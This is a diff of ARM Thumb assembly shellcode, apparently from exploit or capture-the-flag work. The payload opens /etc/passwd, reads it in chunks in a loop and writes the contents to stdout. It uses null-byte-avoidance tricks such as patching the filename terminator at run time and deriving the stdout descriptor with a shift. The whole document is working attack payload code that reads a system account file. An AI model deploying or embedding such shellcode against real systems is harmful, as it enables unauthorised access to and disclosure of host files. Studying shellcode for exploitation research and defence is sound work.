@@ -9,27 +9,34 @@ _start:
 	.code 16
 
 	// open("/etc/passwd", O_RDONLY) 
-	mov r7, #5
 	adr r0, filename
 	eor r1, r1
 	strb r1, [r0, #0xb]
+
+	mov r7, #5 // SYS_open
 	swi #1
 
-	// read(filefd, buf, 0x1337)
-	mov r7, #3
-	mov r2, #0x13
-	lsl r2, #8
-	add r2, #0x37
-	mov r1, sp
-	sub r1, r2
-	swi #1
-	
-	// write(stdout, buf, len(buf))
+	mov r3, r0
 
-	add r7, #1
-	mov r2, r0
-	mov r0, #1
-	swi #1
+	// read(filefd, buf, 0x40)
+	readchunk:
+		mov r0, r3
+		mov r2, #0x40
+		sub sp, #0x40
+		mov r1, sp
+
+		mov r7, #3 // SYS_read
+		swi #1
+
+		// write(stdout, buf, len(buf))
+		mov r2, r0
+		beq filename
+
+		lsr r0, r2, #0x6
+		
+		mov r7, #4 // SYS_write
+		swi #1
+		b readchunk
 
 	filename:
 	.ascii "/etc/passwdx"
